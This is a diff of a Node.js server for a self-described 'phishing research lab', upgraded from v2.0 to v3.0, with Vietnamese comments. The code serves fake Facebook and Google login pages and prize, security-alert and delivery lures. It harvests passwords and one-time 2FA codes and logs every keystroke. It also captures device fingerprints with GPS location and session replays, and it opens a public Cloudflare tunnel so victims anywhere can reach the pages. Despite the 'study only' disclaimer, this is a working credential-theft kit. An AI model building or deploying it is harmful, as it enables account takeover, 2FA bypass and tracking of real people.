@@ -1,69 +1,106 @@
 /**
  * ============================================================
- *  PHISHING RESEARCH LAB - Server Backend (v2.0)
+ *  PHISHING RESEARCH LAB - Server Backend (v3.0)
  *  Mục đích: Nghiên cứu bảo mật - CHỈ DÙNG CHO MỤC ĐÍCH HỌC TẬP
  * ============================================================
  * 
- *  Tính năng:
- *  1. Phục vụ trang phishing giả mạo (Facebook, Google)
- *  2. Thu thập credentials khi nạn nhân submit form
- *  3. Keylogger realtime - ghi từng phím gõ
- *  4. Dashboard premium để xem/phân tích dữ liệu
- *  5. Tự động tạo Cloudflare Tunnel → truy cập qua Internet
- *     (KHÔNG CẦN cùng WiFi!)
+ *  Tính năng v3.0:
+ *  1. WebSocket realtime push (thay polling 5s)
+ *  2. Session Replay — ghi lại hành vi chuột/scroll/hesitation
+ *  3. Anti-Detection Evasion Module
+ *  4. Landing pages (trúng thưởng, cảnh báo, giao hàng)
+ *  5. 2FA giả + CAPTCHA giả (Facebook/Google)
+ *  6. Campaign tracking
+ *  7. Tất cả tính năng v2.0
  */
 
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
+const http = require('http');
+const { WebSocketServer } = require('ws');
 const { spawn } = require('child_process');
 
 const app = express();
 const PORT = 3000;
 
+// ==========================================
+//  HTTP + WebSocket Server
+// ==========================================
+const server = http.createServer(app);
+const wss = new WebSocketServer({ server });
+
+// Track connected dashboard clients
+const dashboardClients = new Set();
+
+wss.on('connection', (ws, req) => {
+    console.log('📡 Dashboard WebSocket connected');
+    dashboardClients.add(ws);
+    
+    ws.on('close', () => {
+        dashboardClients.delete(ws);
+        console.log('📡 Dashboard WebSocket disconnected');
+    });
+    
+    ws.on('error', () => dashboardClients.delete(ws));
+    
+    // Gửi trạng thái tunnel ngay khi kết nối
+    ws.send(JSON.stringify({ type: 'tunnel', url: tunnelUrl, status: tunnelStatus }));
+});
+
+// Broadcast tới tất cả dashboard clients
+function broadcast(data) {
+    const msg = JSON.stringify(data);
+    dashboardClients.forEach(ws => {
+        try {
+            if (ws.readyState === 1) ws.send(msg);
+        } catch(e) {}
+    });
+}
+
 // Biến lưu tunnel URL
 let tunnelUrl = null;
-let tunnelStatus = 'starting'; // starting, connected, failed
+let tunnelStatus = 'starting';
 
 // Middleware
-app.use(express.json());
+app.use(express.json({ limit: '5mb' }));
 app.use(express.urlencoded({ extended: true }));
 
 // File lưu trữ dữ liệu
-const DATA_FILE = path.join(__dirname, 'harvested_data.json');
-const KEYLOG_FILE = path.join(__dirname, 'keylog_data.json');
+const DATA_FILE        = path.join(__dirname, 'harvested_data.json');
+const KEYLOG_FILE      = path.join(__dirname, 'keylog_data.json');
 const FINGERPRINT_FILE = path.join(__dirname, 'fingerprint_data.json');
+const SESSION_FILE     = path.join(__dirname, 'session_replay.json');
+const CAMPAIGN_FILE    = path.join(__dirname, 'campaigns.json');
 
 // Khởi tạo files nếu chưa có
-if (!fs.existsSync(DATA_FILE)) {
-    fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
-}
-if (!fs.existsSync(KEYLOG_FILE)) {
-    fs.writeFileSync(KEYLOG_FILE, JSON.stringify([], null, 2));
-}
-if (!fs.existsSync(FINGERPRINT_FILE)) {
-    fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify([], null, 2));
-}
+[DATA_FILE, KEYLOG_FILE, FINGERPRINT_FILE, SESSION_FILE, CAMPAIGN_FILE].forEach(f => {
+    if (!fs.existsSync(f)) fs.writeFileSync(f, JSON.stringify([], null, 2));
+});
 
 // ==========================================
-//  ROUTE: Phục vụ trang phishing (giả mạo)
+//  ROUTE: Static files
 // ==========================================
 app.use('/phishing', express.static(path.join(__dirname, 'public', 'phishing')));
+app.use('/landing',  express.static(path.join(__dirname, 'public', 'landing')));
+app.use('/dashboard', express.static(path.join(__dirname, 'public', 'dashboard')));
 
 // ==========================================
 //  API: Thu hoạch credentials
 // ==========================================
 app.post('/api/harvest', (req, res) => {
-    const { email, password, page_type } = req.body;
-    
+    const { email, password, page_type, otp, session_id, campaign_id } = req.body;
+
     const entry = {
         id: Date.now(),
         timestamp: new Date().toISOString(),
         page_type: page_type || 'facebook',
+        campaign_id: campaign_id || 'default',
         credentials: {
             email: email || '',
-            password: password || ''
+            password: password || '',
+            otp: otp || null
         },
         metadata: {
             ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
@@ -71,92 +108,62 @@ app.post('/api/harvest', (req, res) => {
             referer: req.headers['referer'] || '',
             accept_language: req.headers['accept-language'] || '',
             platform: extractPlatform(req.headers['user-agent'] || ''),
-            screen_info: req.body.screen_info || null
+            screen_info: req.body.screen_info || null,
+            session_id: session_id || null
         }
     };
 
-    let data = [];
-    try {
-        data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-    } catch (e) {
-        data = [];
-    }
-
+    let data = readJson(DATA_FILE);
     data.push(entry);
-    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
+    writeJson(DATA_FILE, data);
 
-    // Tìm fingerprint của session này
-    let fp = null;
-    try {
-        const fpData = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
-        fp = fpData.find(f => f.session_id && req.body.session_id && f.session_id === req.body.session_id) || fpData[fpData.length - 1];
-    } catch(e) {}
-
-    // Log ra terminal
+    // Log
     console.log('\n' + '='.repeat(60));
     console.log('🎣 DỮ LIỆU MỚI THU HOẠCH ĐƯỢC!');
     console.log('='.repeat(60));
-    console.log(`⏰ Thời gian:  ${entry.timestamp}`);
-    console.log(`📄 Loại trang: ${entry.page_type.toUpperCase()}`);
+    console.log(`⏰ ${entry.timestamp}`);
+    console.log(`📄 ${entry.page_type.toUpperCase()} | Campaign: ${entry.campaign_id}`);
     console.log(`📧 Email/SĐT:  ${entry.credentials.email}`);
     console.log(`🔑 Mật khẩu:   ${entry.credentials.password}`);
-    console.log(`📱 Thiết bị:   ${entry.metadata.platform}`);
-    console.log(`🌐 IP:         ${entry.metadata.ip}`);
-    if (fp) {
-        console.log(`📲 Tên máy:    ${fp.device?.device_name || 'N/A'}`);
-        console.log(`💻 OS:         ${fp.device?.os || ''} ${fp.device?.os_version || ''}`);
-        console.log(`🌍 Trình duyệt: ${fp.device?.browser || ''} ${fp.device?.browser_version || ''}`);
-        if (fp.location && !fp.location.error) {
-            console.log(`📍 Vị trí:     ${fp.location.latitude}, ${fp.location.longitude}`);
-            console.log(`🗺️  Maps:       ${fp.location.google_maps}`);
-        } else {
-            console.log(`📍 Vị trí:     ${fp.location?.error || 'Chưa có'}`);
-        }
-    }
+    if (otp) console.log(`🔐 OTP:        ${otp}`);
+    console.log(`📱 ${entry.metadata.platform} | IP: ${entry.metadata.ip}`);
     console.log('='.repeat(60) + '\n');
 
-    res.json({ 
-        success: true, 
-        redirect: getRedirectUrl(page_type) 
-    });
+    // Broadcast WebSocket
+    broadcast({ type: 'new_harvest', data: entry });
+
+    res.json({ success: true, redirect: getRedirectUrl(page_type) });
 });
 
 // ==========================================
-//  API: Keylogger - ghi từng phím gõ realtime
+//  API: Keylogger
 // ==========================================
 app.post('/api/keylog', (req, res) => {
     const { field, value, key, page_type, session_id } = req.body;
-    
+
     const entry = {
         timestamp: new Date().toISOString(),
         session_id: session_id || 'unknown',
         page_type: page_type || 'facebook',
-        field: field || '',
-        key: key || '',
+        field, key,
         current_value: value || '',
         ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
         platform: extractPlatform(req.headers['user-agent'] || '')
     };
 
-    let data = [];
-    try {
-        data = JSON.parse(fs.readFileSync(KEYLOG_FILE, 'utf8'));
-    } catch (e) {
-        data = [];
-    }
-
-    // Giữ tối đa 5000 keylog entries
-    if (data.length > 5000) {
-        data = data.slice(-2500);
-    }
+    let data = readJson(KEYLOG_FILE);
+    if (data.length > 5000) data = data.slice(-2500);
     data.push(entry);
-    fs.writeFileSync(KEYLOG_FILE, JSON.stringify(data, null, 2));
+    writeJson(KEYLOG_FILE, data);
+
+    // Broadcast keylog realtime
+    broadcast({ type: 'keylog', data: entry });
 
     res.json({ ok: true });
 });
 
 // ==========================================
-//  API: Fingerprint - thu thập thiết bị + vị trí
+//  API: Fingerprint
 // ==========================================
 app.post('/api/fingerprint', (req, res) => {
     const fingerprint = {
@@ -165,241 +172,249 @@ app.post('/api/fingerprint', (req, res) => {
         received_at: new Date().toISOString()
     };
 
-    let data = [];
-    try {
-        data = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
-    } catch (e) {
-        data = [];
-    }
-
-    // Giữ tối đa 500 fingerprints
+    let data = readJson(FINGERPRINT_FILE);
     if (data.length > 500) data = data.slice(-250);
     data.push(fingerprint);
-    fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify(data, null, 2));
+    writeJson(FINGERPRINT_FILE, data);
 
-    // Log thiết bị + vị trí
     const dev = fingerprint.device || {};
     const loc = fingerprint.location || {};
     console.log('\n' + '-'.repeat(50));
     console.log('📲 THIẾT BỊ MỚI TRUY CẬP!');
-    console.log('-'.repeat(50));
-    console.log(`📱 Tên máy:    ${dev.device_name || 'N/A'}`);
-    console.log(`💻 OS:         ${dev.os || ''} ${dev.os_version || ''}`);
-    console.log(`🌍 Trình duyệt: ${dev.browser || ''} v${dev.browser_version || ''}`);
-    console.log(`📐 Màn hình:   ${dev.screen_width}x${dev.screen_height} (@${dev.pixel_ratio}x)`);
-    console.log(`🔌 Kết nối:    ${dev.connection?.type || 'N/A'}`);
-    if (loc.latitude) {
-        console.log(`📍 VỊ TRÍ:     ${loc.latitude}, ${loc.longitude} (±${loc.accuracy})`);
-        console.log(`🗺️  Google Maps: ${loc.google_maps}`);
-    } else {
-        console.log(`📍 Vị trí:     ${loc.error || 'Đang chờ...'}`);
-    }
-    if (fingerprint.battery) {
-        console.log(`🔋 Pin:        ${fingerprint.battery.level} (${fingerprint.battery.charging})`);
-    }
+    console.log(`📱 ${dev.device_name || 'N/A'} | ${dev.os || ''} ${dev.os_version || ''}`);
+    console.log(`🌍 ${dev.browser || ''} v${dev.browser_version || ''}`);
+    if (loc.latitude) console.log(`📍 ${loc.latitude}, ${loc.longitude} (±${loc.accuracy})`);
     console.log('-'.repeat(50) + '\n');
+
+    // Broadcast
+    broadcast({ type: 'new_fingerprint', data: fingerprint });
 
     res.json({ ok: true });
 });
 
-// API lấy fingerprint data
-app.get('/api/fingerprints', (req, res) => {
-    try {
-        const data = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
-        res.json({ total: data.length, entries: data.reverse() });
-    } catch (e) {
-        res.json({ total: 0, entries: [] });
-    }
-});
-
 // ==========================================
-//  DASHBOARD Routes
+//  API: Session Replay — ghi hành vi
 // ==========================================
-app.use('/dashboard', express.static(path.join(__dirname, 'public', 'dashboard')));
+app.post('/api/session-replay', (req, res) => {
+    const { session_id, events, page_type, campaign_id } = req.body;
+    
+    if (!session_id || !events) return res.json({ ok: false });
 
-// API lấy dữ liệu
-app.get('/api/data', (req, res) => {
-    try {
-        const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-        res.json({
-            total: data.length,
-            entries: data.reverse()
-        });
-    } catch (e) {
-        res.json({ total: 0, entries: [] });
-    }
-});
-
-// API lấy keylog data
-app.get('/api/keylog', (req, res) => {
-    try {
-        const data = JSON.parse(fs.readFileSync(KEYLOG_FILE, 'utf8'));
-        // Nhóm theo session
-        const sessions = {};
-        data.forEach(entry => {
-            const sid = entry.session_id || 'unknown';
-            if (!sessions[sid]) {
-                sessions[sid] = {
-                    session_id: sid,
-                    page_type: entry.page_type,
-                    ip: entry.ip,
-                    platform: entry.platform,
-                    start_time: entry.timestamp,
-                    keystrokes: []
-                };
-            }
-            sessions[sid].keystrokes.push({
-                time: entry.timestamp,
-                field: entry.field,
-                key: entry.key,
-                value: entry.current_value
-            });
-            sessions[sid].end_time = entry.timestamp;
-        });
-        
-        res.json({
-            total_keystrokes: data.length,
-            sessions: Object.values(sessions).reverse()
-        });
-    } catch (e) {
-        res.json({ total_keystrokes: 0, sessions: [] });
-    }
-});
-
-// API xóa toàn bộ dữ liệu
-app.delete('/api/data', (req, res) => {
-    fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
-    fs.writeFileSync(KEYLOG_FILE, JSON.stringify([], null, 2));
-    fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify([], null, 2));
-    console.log('🗑️  Đã xóa toàn bộ dữ liệu.');
-    res.json({ success: true });
-});
-
-// API xóa 1 harvest entry theo timestamp
-app.delete('/api/data/:timestamp', (req, res) => {
-    try {
-        let data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-        const before = data.length;
-        data = data.filter(e => e.timestamp !== decodeURIComponent(req.params.timestamp));
-        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
-        res.json({ success: true, removed: before - data.length });
-    } catch(e) { res.json({ success: false }); }
-});
-
-// API xóa 1 fingerprint entry theo received_at
-app.delete('/api/fingerprint/:received_at', (req, res) => {
-    try {
-        let data = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
-        const before = data.length;
-        data = data.filter(e => e.received_at !== decodeURIComponent(req.params.received_at));
-        fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify(data, null, 2));
-        res.json({ success: true, removed: before - data.length });
-    } catch(e) { res.json({ success: false }); }
-});
-
-// API đếm số entries (để check có data mới không)
-app.get('/api/count', (req, res) => {
-    try {
-        const harvest = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')).length;
-        const fp = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8')).length;
-        res.json({ harvest, fp, total: harvest + fp });
-    } catch(e) { res.json({ harvest: 0, fp: 0, total: 0 }); }
-});
-
-// API thống kê
-app.get('/api/stats', (req, res) => {
-    try {
-        const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-        const keylogData = JSON.parse(fs.readFileSync(KEYLOG_FILE, 'utf8'));
-        
-        const stats = {
-            total_entries: data.length,
-            total_keystrokes: keylogData.length,
-            by_platform: {},
-            by_page_type: {},
-            timeline: {},
-            recent_activity: data.slice(-5).reverse()
+    let data = readJson(SESSION_FILE);
+    
+    // Tìm session hiện có hoặc tạo mới
+    let sessionEntry = data.find(s => s.session_id === session_id);
+    if (!sessionEntry) {
+        sessionEntry = {
+            session_id,
+            page_type: page_type || 'unknown',
+            campaign_id: campaign_id || 'default',
+            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
+            user_agent: req.headers['user-agent'] || '',
+            started_at: new Date().toISOString(),
+            updated_at: new Date().toISOString(),
+            events: []
         };
-
-        data.forEach(entry => {
-            const platform = entry.metadata?.platform || 'Unknown';
-            stats.by_platform[platform] = (stats.by_platform[platform] || 0) + 1;
-
-            const pageType = entry.page_type || 'unknown';
-            stats.by_page_type[pageType] = (stats.by_page_type[pageType] || 0) + 1;
-
-            const date = entry.timestamp.split('T')[0];
-            stats.timeline[date] = (stats.timeline[date] || 0) + 1;
-        });
-
-        res.json(stats);
-    } catch (e) {
-        res.json({ total_entries: 0, total_keystrokes: 0, by_platform: {}, by_page_type: {}, timeline: {} });
+        data.push(sessionEntry);
     }
+    
+    sessionEntry.updated_at = new Date().toISOString();
+    sessionEntry.events.push(...(Array.isArray(events) ? events : [events]));
+    
+    // Giới hạn 2000 events/session
+    if (sessionEntry.events.length > 2000) {
+        sessionEntry.events = sessionEntry.events.slice(-1000);
+    }
+    
+    // Giới hạn 200 sessions
+    if (data.length > 200) data = data.slice(-100);
+    
+    writeJson(SESSION_FILE, data);
+    
+    // Broadcast
+    broadcast({ type: 'session_event', session_id, events });
+    
+    res.json({ ok: true });
 });
 
-// API lấy tunnel URL
+// ==========================================
+//  API: GET endpoints
+// ==========================================
+app.get('/api/fingerprints', (req, res) => {
+    const data = readJson(FINGERPRINT_FILE);
+    res.json({ total: data.length, entries: data.slice().reverse() });
+});
+
+app.get('/api/data', (req, res) => {
+    const data = readJson(DATA_FILE);
+    res.json({ total: data.length, entries: data.slice().reverse() });
+});
+
+app.get('/api/keylog', (req, res) => {
+    const data = readJson(KEYLOG_FILE);
+    const sessions = {};
+    data.forEach(entry => {
+        const sid = entry.session_id || 'unknown';
+        if (!sessions[sid]) {
+            sessions[sid] = {
+                session_id: sid,
+                page_type: entry.page_type,
+                ip: entry.ip,
+                platform: entry.platform,
+                start_time: entry.timestamp,
+                keystrokes: []
+            };
+        }
+        sessions[sid].keystrokes.push({ time: entry.timestamp, field: entry.field, key: entry.key, value: entry.current_value });
+        sessions[sid].end_time = entry.timestamp;
+    });
+    res.json({ total_keystrokes: data.length, sessions: Object.values(sessions).reverse() });
+});
+
+app.get('/api/session-replay', (req, res) => {
+    const data = readJson(SESSION_FILE);
+    res.json({ total: data.length, sessions: data.slice().reverse() });
+});
+
+app.get('/api/session-replay/:session_id', (req, res) => {
+    const data = readJson(SESSION_FILE);
+    const session = data.find(s => s.session_id === req.params.session_id);
+    if (!session) return res.status(404).json({ error: 'Not found' });
+    res.json(session);
+});
+
+app.get('/api/count', (req, res) => {
+    const harvest = readJson(DATA_FILE).length;
+    const fp = readJson(FINGERPRINT_FILE).length;
+    const replay = readJson(SESSION_FILE).length;
+    res.json({ harvest, fp, replay, total: harvest + fp });
+});
+
+app.get('/api/stats', (req, res) => {
+    const data = readJson(DATA_FILE);
+    const keylogData = readJson(KEYLOG_FILE);
+    
+    const stats = {
+        total_entries: data.length,
+        total_keystrokes: keylogData.length,
+        by_platform: {},
+        by_page_type: {},
+        timeline: {},
+        recent_activity: data.slice(-5).reverse()
+    };
+
+    data.forEach(entry => {
+        const platform = entry.metadata?.platform || 'Unknown';
+        stats.by_platform[platform] = (stats.by_platform[platform] || 0) + 1;
+        const pageType = entry.page_type || 'unknown';
+        stats.by_page_type[pageType] = (stats.by_page_type[pageType] || 0) + 1;
+        const date = entry.timestamp.split('T')[0];
+        stats.timeline[date] = (stats.timeline[date] || 0) + 1;
+    });
+
+    res.json(stats);
+});
+
 app.get('/api/tunnel', (req, res) => {
-    res.json({ 
+    res.json({
         url: tunnelUrl,
         status: tunnelStatus,
         phishing_links: tunnelUrl ? {
             facebook: `${tunnelUrl}/phishing/facebook.html`,
-            google: `${tunnelUrl}/phishing/google.html`
+            google: `${tunnelUrl}/phishing/google.html`,
+            prize: `${tunnelUrl}/landing/prize.html`,
+            security: `${tunnelUrl}/landing/security.html`,
+            delivery: `${tunnelUrl}/landing/delivery.html`
         } : null
     });
 });
 
 // ==========================================
-//  Trang chủ → Dashboard
+//  API: DELETE endpoints
 // ==========================================
-app.get('/', (req, res) => {
-    res.redirect('/dashboard');
+app.delete('/api/data', (req, res) => {
+    writeJson(DATA_FILE, []);
+    writeJson(KEYLOG_FILE, []);
+    writeJson(FINGERPRINT_FILE, []);
+    writeJson(SESSION_FILE, []);
+    console.log('🗑️  Đã xóa toàn bộ dữ liệu.');
+    broadcast({ type: 'data_cleared' });
+    res.json({ success: true });
+});
+
+app.delete('/api/data/:timestamp', (req, res) => {
+    let data = readJson(DATA_FILE);
+    const before = data.length;
+    data = data.filter(e => e.timestamp !== decodeURIComponent(req.params.timestamp));
+    writeJson(DATA_FILE, data);
+    res.json({ success: true, removed: before - data.length });
+});
+
+app.delete('/api/fingerprint/:received_at', (req, res) => {
+    let data = readJson(FINGERPRINT_FILE);
+    const before = data.length;
+    data = data.filter(e => e.received_at !== decodeURIComponent(req.params.received_at));
+    writeJson(FINGERPRINT_FILE, data);
+    res.json({ success: true, removed: before - data.length });
+});
+
+app.delete('/api/session-replay/:session_id', (req, res) => {
+    let data = readJson(SESSION_FILE);
+    const before = data.length;
+    data = data.filter(s => s.session_id !== req.params.session_id);
+    writeJson(SESSION_FILE, data);
+    res.json({ success: true, removed: before - data.length });
 });
 
 // ==========================================
-//  Hàm tiện ích
+//  TRANG CHỦ
 // ==========================================
-function extractPlatform(userAgent) {
-    if (/iPhone/i.test(userAgent)) return 'iPhone';
-    if (/iPad/i.test(userAgent)) return 'iPad';
-    if (/Android/i.test(userAgent)) return 'Android';
-    if (/Windows Phone/i.test(userAgent)) return 'Windows Phone';
-    if (/Windows/i.test(userAgent)) return 'Windows PC';
-    if (/Macintosh/i.test(userAgent)) return 'Mac';
-    if (/Linux/i.test(userAgent)) return 'Linux';
+app.get('/', (req, res) => res.redirect('/dashboard'));
+
+// ==========================================
+//  UTILITY FUNCTIONS
+// ==========================================
+function readJson(file) {
+    try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch(e) { return []; }
+}
+function writeJson(file, data) {
+    fs.writeFileSync(file, JSON.stringify(data, null, 2));
+}
+function extractPlatform(ua) {
+    if (/iPhone/i.test(ua)) return 'iPhone';
+    if (/iPad/i.test(ua)) return 'iPad';
+    if (/Android/i.test(ua)) return 'Android';
+    if (/Windows Phone/i.test(ua)) return 'Windows Phone';
+    if (/Windows/i.test(ua)) return 'Windows PC';
+    if (/Macintosh/i.test(ua)) return 'Mac';
+    if (/Linux/i.test(ua)) return 'Linux';
     return 'Unknown';
 }
-
 function getRedirectUrl(pageType) {
     const redirects = {
-        'facebook': 'https://www.facebook.com',
-        'google': 'https://accounts.google.com',
-        'banking': 'https://www.google.com',
-        'zalo': 'https://zalo.me'
+        facebook: 'https://www.facebook.com',
+        google: 'https://accounts.google.com',
+        banking: 'https://www.google.com',
+        zalo: 'https://zalo.me',
+        momo: 'https://momo.vn'
     };
     return redirects[pageType] || 'https://www.facebook.com';
 }
-
 function getLocalIP() {
     const interfaces = os.networkInterfaces();
     for (const name of Object.keys(interfaces)) {
         for (const iface of interfaces[name]) {
-            if (iface.family === 'IPv4' && !iface.internal) {
-                return iface.address;
-            }
+            if (iface.family === 'IPv4' && !iface.internal) return iface.address;
         }
     }
     return '127.0.0.1';
 }
 
 // ==========================================
-//  Cloudflare Tunnel (tự động)
+//  Cloudflare Tunnel
 // ==========================================
 function startTunnel() {
-    console.log('\n  🌐 Đang tạo Cloudflare Tunnel...');
-    console.log('  ⏳ Chờ khoảng 10-20 giây...\n');
-    
+    console.log('\n  🌐 Đang tạo Cloudflare Tunnel...\n');
     tunnelStatus = 'starting';
 
     const cf = spawn('npx', ['-y', 'cloudflared', 'tunnel', '--url', `http://localhost:${PORT}`], {
@@ -407,53 +422,41 @@ function startTunnel() {
         stdio: ['ignore', 'pipe', 'pipe']
     });
 
-    cf.stderr.on('data', (data) => {
+    const handleOutput = (data) => {
         const output = data.toString();
         const match = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
         if (match && !tunnelUrl) {
             tunnelUrl = match[0];
             tunnelStatus = 'connected';
-            
-            console.log('╔' + '═'.repeat(62) + '╗');
-            console.log('║' + ' '.repeat(10) + '🌍 CLOUDFLARE TUNNEL - SẴN SÀNG!' + ' '.repeat(19) + '║');
-            console.log('╠' + '═'.repeat(62) + '╣');
-            console.log('║' + ' '.repeat(62) + '║');
-            console.log('║  📘 Facebook Phishing:' + ' '.repeat(38) + '║');
-            console.log(`║  ${tunnelUrl}/phishing/facebook.html`.padEnd(63) + '║');
-            console.log('║' + ' '.repeat(62) + '║');
-            console.log('║  📧 Google Phishing:' + ' '.repeat(40) + '║');
-            console.log(`║  ${tunnelUrl}/phishing/google.html`.padEnd(63) + '║');
-            console.log('║' + ' '.repeat(62) + '║');
-            console.log('║  📱 Mở link trên điện thoại bất kỳ mạng (4G/WiFi khác)' + ' '.repeat(5) + '║');
-            console.log('║     → KHÔNG CẦN cùng mạng WiFi!' + ' '.repeat(29) + '║');
-            console.log('║' + ' '.repeat(62) + '║');
-            console.log('║  📊 Dashboard: http://localhost:' + PORT + '/dashboard' + ' '.repeat(18) + '║');
-            console.log('╚' + '═'.repeat(62) + '╝');
-            console.log('');
-        }
-    });
 
-    cf.stdout.on('data', (data) => {
-        const output = data.toString();
-        const match = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
-        if (match && !tunnelUrl) {
-            tunnelUrl = match[0];
-            tunnelStatus = 'connected';
-            console.log(`\n  🌍 Tunnel URL: ${tunnelUrl}\n`);
+            console.log('╔' + '═'.repeat(66) + '╗');
+            console.log('║' + '   🌍 CLOUDFLARE TUNNEL - SẴN SÀNG!'.padEnd(66) + '║');
+            console.log('╠' + '═'.repeat(66) + '╣');
+            console.log(`║  📘 Facebook:  ${tunnelUrl}/phishing/facebook.html`.padEnd(67) + '║');
+            console.log(`║  📧 Google:    ${tunnelUrl}/phishing/google.html`.padEnd(67) + '║');
+            console.log(`║  🎁 Trúng thưởng: ${tunnelUrl}/landing/prize.html`.padEnd(67) + '║');
+            console.log(`║  🔒 Cảnh báo:  ${tunnelUrl}/landing/security.html`.padEnd(67) + '║');
+            console.log(`║  📦 Giao hàng: ${tunnelUrl}/landing/delivery.html`.padEnd(67) + '║');
+            console.log('╚' + '═'.repeat(66) + '╝\n');
+
+            // Notify all dashboard clients
+            broadcast({ type: 'tunnel', url: tunnelUrl, status: 'connected' });
         }
-    });
+    };
+
+    cf.stderr.on('data', handleOutput);
+    cf.stdout.on('data', handleOutput);
 
     cf.on('error', (err) => {
         tunnelStatus = 'failed';
-        console.log('\n  ❌ Không thể khởi động Cloudflare Tunnel.');
-        console.log('  💡 Chạy thủ công: npx cloudflared tunnel --url http://localhost:3000');
-        console.log('  Lỗi:', err.message);
+        broadcast({ type: 'tunnel', url: null, status: 'failed' });
+        console.log('\n  ❌ Cloudflare Tunnel thất bại:', err.message);
     });
 
     cf.on('close', (code) => {
         if (code !== 0 && code !== null) {
             tunnelStatus = 'failed';
-            console.log(`\n  ⚠️  Tunnel đã dừng (code: ${code})`);
+            broadcast({ type: 'tunnel', url: null, status: 'failed' });
         }
     });
 }
@@ -461,24 +464,18 @@ function startTunnel() {
 // ==========================================
 //  Khởi động server
 // ==========================================
-app.listen(PORT, '0.0.0.0', () => {
+server.listen(PORT, '0.0.0.0', () => {
     const localIP = getLocalIP();
-    
     console.log('');
-    console.log('╔' + '═'.repeat(62) + '╗');
-    console.log('║' + ' '.repeat(10) + '🔬 PHISHING RESEARCH LAB v2.0' + ' '.repeat(22) + '║');
-    console.log('╠' + '═'.repeat(62) + '╣');
-    console.log('║' + ' '.repeat(62) + '║');
-    console.log('║  📊 Dashboard:  http://localhost:' + PORT + '/dashboard' + ' '.repeat(17) + '║');
-    console.log(`║  🌐 Local IP:   http://${localIP}:${PORT}`.padEnd(63) + '║');
-    console.log('║' + ' '.repeat(62) + '║');
-    console.log('║  📘 Facebook:   /phishing/facebook.html' + ' '.repeat(21) + '║');
-    console.log('║  📧 Google:     /phishing/google.html' + ' '.repeat(23) + '║');
-    console.log('║' + ' '.repeat(62) + '║');
-    console.log('║  ⚠️  CHỈ DÙNG CHO MỤC ĐÍCH NGHIÊN CỨU!' + ' '.repeat(20) + '║');
-    console.log('╚' + '═'.repeat(62) + '╝');
-    console.log('');
+    console.log('╔' + '═'.repeat(66) + '╗');
+    console.log('║' + '   🔬 PHISHING RESEARCH LAB v3.0'.padEnd(66) + '║');
+    console.log('╠' + '═'.repeat(66) + '╣');
+    console.log(`║  📊 Dashboard:  http://localhost:${PORT}/dashboard`.padEnd(67) + '║');
+    console.log(`║  🌐 Local IP:   http://${localIP}:${PORT}`.padEnd(67) + '║');
+    console.log('║' + '   ⚡ WebSocket realtime ENABLED'.padEnd(66) + '║');
+    console.log('║' + '   📡 Session Replay ENABLED'.padEnd(66) + '║');
+    console.log('║' + '   ⚠️  CHỈ DÙNG CHO MỤC ĐÍCH NGHIÊN CỨU!'.padEnd(66) + '║');
+    console.log('╚' + '═'.repeat(66) + '╝\n');
 
-    // Tự động khởi động tunnel
     startTunnel();
 });
